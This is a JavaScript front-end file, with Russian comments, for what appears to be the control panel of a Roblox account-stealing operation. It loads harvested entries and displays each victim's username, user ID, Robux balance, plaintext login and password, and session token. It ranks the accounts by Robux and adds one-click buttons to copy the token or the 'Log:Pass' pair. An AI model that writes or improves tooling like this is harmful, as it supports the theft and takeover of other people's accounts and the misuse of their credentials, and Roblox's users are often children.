// ── Страница токенов (статическая версия) ─────────────────────────────────────
if (!requireLogin()) throw new Error('redirect');

document.getElementById('headerSlot').innerHTML = renderHeader('tokens');
bindLogout();

let allTokens = [];
let sortMode = 'date'; // 'date' или 'robux'

async function loadTokens() {
  try {
    const r = await apiFetch('/robux');
    const data = await r.json();
    allTokens = data.tokens || [];
    renderTokens();
  } catch (e) {
    if (e.message !== 'auth') toast('Ошибка загрузки токенов', 'err');
    document.getElementById('tokensContainer').innerHTML = "<div class='empty'><span class='empty-icon'>❌</span>Ошибка загрузки</div>";
  }
}

function renderTokens() {
  const container = document.getElementById('tokensContainer');
  
  if (allTokens.length === 0) {
    container.innerHTML = "<div class='empty'><span class='empty-icon'>📭</span>База токенов пуста</div>";
    return;
  }

  // Сортировка
  let list = [...allTokens];
  if (sortMode === 'robux') {
    list.sort((a, b) => {
      const ar = (a.info && a.info.robux) ? a.info.robux : -1;
      const br = (b.info && b.info.robux) ? b.info.robux : -1;
      return br - ar; // по убыванию
    });
  } else {
    // по новизне (по файлу - timestamp обычно в имени, но если нет, оставляем как пришло)
    // Так как сервер отдает файлы в порядке изменения, просто оставляем оригинальный порядок
    // если только не требуется парсить имя файла
  }

  let html = "";
  for (let i = 0; i < list.length; i++) {
    const t = list[i];
    const isInvalid = t.info && t.info.valid === false;
    
    // Fallbacks
    const username = (t.info && t.info.username) ? t.info.username : (t.user || 'Неизвестно');
    const userId = (t.info && t.info.userId) ? t.info.userId : '—';
    const robux = (t.info && t.info.robux !== undefined) ? t.info.robux.toLocaleString() + ' R$' : '⏳ Не проверен';
    const status = isInvalid ? 'Недействителен' : ((t.info && t.info.checked) ? '✅ Проверен' : '—');
    
    const cardClass = isInvalid ? "token-card invalid" : "token-card";
    const robuxClass = isInvalid ? "token-robux invalid" : "token-robux";
    const fileBase = t.file.split('/').pop();

    html += `
      <div class="${cardClass}">
        <div class="token-card-header">
          <div class="token-user-info">
            <div class="token-avatar">
              <img src="https://tr.rbxcdn.com/38c6edcb50633730ff4cf39ac8859840/150/150/AvatarHeadshot/Png" alt="" onerror="this.style.display='none'">
            </div>
            <div>
              <div class="token-username">${escapeHtml(username)}</div>
              <div class="token-userid">ID: ${escapeHtml(String(userId))}</div>
            </div>
          </div>
          <div class="${robuxClass}">${isInvalid ? '❌ ' + robux : robux}</div>
        </div>
        
        <div class="token-card-body">
          <div class="token-row">
            <span class="token-row-label">Логин:</span>
            <span class="token-row-value" style="font-weight:700;">${escapeHtml(t.user || '—')}</span>
          </div>
          <div class="token-row">
            <span class="token-row-label">Пароль:</span>
            <span class="token-row-value" style="color:var(--danger);font-weight:700;">${escapeHtml(t.pass || '—')}</span>
          </div>
          <div class="token-row">
            <span class="token-row-label">Файл:</span>
            <span class="token-row-value" style="font-size:0.7rem;">${escapeHtml(fileBase)}</span>
          </div>
          <div class="token-row" style="margin-top:4px;">
            <div class="token-display" style="width:100%;">${escapeHtml(t.token)}</div>
          </div>
        </div>

        <div class="token-card-footer">
          <button class="copy-btn" onclick="copyText('${escapeHtml(t.token).replace(/'/g, "\\'")}')">Копировать Token</button>
          <button class="copy-btn" style="background:var(--accent-soft); color:var(--accent-text); border-color:var(--accent-glow);" onclick="copyText('${escapeHtml(t.user)}:${escapeHtml(t.pass)}')">Копировать Log:Pass</button>
        </div>
      </div>
    `;
  }

  container.innerHTML = html;
}

function copyText(text) {
  if (!text || text === '—') return;
  navigator.clipboard.writeText(text).then(function() {
    toast("📋 Скопировано в буфер");
  }).catch(function() {
    const ta = document.createElement("textarea");
    ta.value = text;
    document.body.appendChild(ta);
    ta.select();
    document.execCommand("copy");
    document.body.removeChild(ta);
    toast("📋 Скопировано");
  });
}

// ── Сортировка ─────────────────────────────────────────────────────────────────
document.getElementById('btnSortDate').addEventListener('click', function() {
  sortMode = 'date';
  this.classList.add('active');
  document.getElementById('btnSortRobux').classList.remove('active');
  renderTokens();
});

document.getElementById('btnSortRobux').addEventListener('click', function() {
  sortMode = 'robux';
  this.classList.add('active');
  document.getElementById('btnSortDate').classList.remove('active');
  renderTokens();
});

loadTokens();
